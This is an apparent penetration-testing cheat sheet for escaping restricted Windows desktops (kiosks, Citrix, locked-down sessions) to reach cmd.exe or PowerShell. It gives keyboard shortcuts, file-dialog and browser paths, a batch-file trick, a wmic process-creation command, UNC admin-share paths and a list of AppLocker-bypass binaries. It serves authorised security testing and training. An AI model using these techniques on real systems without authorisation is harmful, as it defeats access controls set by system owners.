
# Windows Desktop Lockdown Escape (CRT-Oriented)

Goal: Escape a restricted desktop (kiosk, Citrix, GPO lockdown, assigned app) and gain OS-level command execution.

# 1. Step 1 – Gain ANY Dialogue Box

Your first objective: get a file dialog or run box.

Try:

## Keyboard Shortcuts

```
Ctrl + S        (Save As)
Ctrl + O        (Open)
Ctrl + P        (Print)
Windows + R     (Run)
Windows + E     (File Explorer)
Ctrl + Shift + Esc (Task Manager)
Alt + F4
Alt + Tab
```

## Accessibility Abuse

```
Shift x5
Hold Shift 8 seconds
Windows + U
```

## F1 Help

Press F1 — sometimes opens browser or help viewer → navigate to filesystem.

# 2. Step 2 – Escape via File Dialog

Once you have:

- Save As
- Open
- Print
- Upload dialog

You now try to reach cmd.exe.

In the address bar type:

```
C:\Windows\System32\cmd.exe
```

Or:

```
powershell.exe
```

Or:

```
explorer.exe
```

Or use environment variables:

```
%SystemRoot%\System32\cmd.exe
%WINDIR%\System32\cmd.exe
%COMSPEC%
```

---

# 3. Search Bar Abuse (Very Common)

In Save/Open dialog:

Type:

```
cmd
```

Or:

```
powershell
```

Or:

```
*.bat
```

If you can search → double click executable.

---

# 4. Notepad / Word Trick

If you can open Notepad or Word:

1. Type:

```
start cmd
```

2. Save as:

```
shell.bat
```

3. Change "Save as type" to:
```
All Files
```

4. Double click file.

# 5. Control Panel Escape

If Control Panel accessible:

Open it → search bar (top right):

```
cmd
```

Or navigate to:

```
System
Administrative Tools
Task Scheduler
```

Create task → run cmd.exe

# 6. Task Manager Escape

If Task Manager allowed:

File → Run new task

Enter:

```
cmd
powershell
explorer
```

Tick:
```
Create this task with administrative privileges
```

---

# 7. Enumerating Users (Often Missed)

If you get command execution:

```
whoami
net user
net localgroup administrators
```

GUI method:

```
lusrmgr.msc
```

If accessible → view users/groups.

# 8. UNC Path Abuse

Try accessing local drive via UNC:

```
\\127.0.0.1\C$
\\localhost\C$
```

Or in file dialog:

```
\\tsclient\
```

# 9. Environment Variable Abuse

Some filters block C:\ but not variables.

Try in address bar:

```
%WINDIR%
%SYSTEMROOT%
%TEMP%
%APPDATA%
%USERPROFILE%
%HOMEDRIVE%
%TMP%
```

Common powerful ones:

```
%COMSPEC%
%SYSTEMDRIVE%
%LOCALAPPDATA%
```

# 10. Browser-Based Escape

If only browser allowed:

Try in address bar:

```
file:///C:/Windows/System32/cmd.exe
file://C:/Windows/System32/cmd.exe
C:/Windows
C:\Windows
```

Variations:

```
File:/C:/Windows
File://C:/Windows
File:///C:/Windows
```

Try:

```
\\127.0.0.1\C$
```

# 11. Allowed Binaries (Living off the Land)

If AppLocker in place, check if these allowed:

```
mshta.exe
rundll32.exe
regsvr32.exe
wmic.exe
powershell.exe
certutil.exe
cscript.exe
wscript.exe
ftp.exe
schtasks.exe
```

Example:

```
wmic process call create cmd.exe
```

---

# 12. Citrix / RDS Specific

Try:

```
Ctrl + Alt + Break
```

Access local drives via:

```
\\tsclient\
```

Check if local disk mapping enabled.

# 13. Assigned Access / Kiosk Mode

Try:

```
Win + X
Win + U
Win + R
```

Try launching:

```
ms-settings:
```

From settings attempt Explorer launch.

# 14. Batch File Discovery

In file dialog search:

```
*.bat
*.cmd
```

If writable directory available:

Create:

```
shell.bat
```

Containing:

```
cmd
```

Execute.

---

# 15. Panic Mode – Fast Attempts Block

```
C:\Windows\System32\cmd.exe
powershell.exe
explorer.exe

%SystemRoot%\System32\cmd.exe
%COMSPEC%
%WINDIR%

cmd
powershell

wmic process call create cmd.exe

\\127.0.0.1\C$
\\localhost\C$

file:///C:/Windows/System32/cmd.exe
```
